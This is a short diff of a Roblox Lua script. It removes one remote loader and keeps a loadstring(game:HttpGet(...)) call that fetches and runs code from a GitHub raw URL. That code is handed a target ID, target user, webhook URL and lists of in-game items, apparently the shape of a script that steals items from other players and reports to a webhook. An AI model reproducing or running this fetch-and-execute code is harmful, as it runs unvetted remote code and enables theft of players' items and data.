@@ -340,10 +340,6 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/1cc2436d7f8a009717e3aa5f4aaeb3c5.lua"))()
-
-    task.wait(1)
-
     local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
     if type(script) == "function" then
         script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
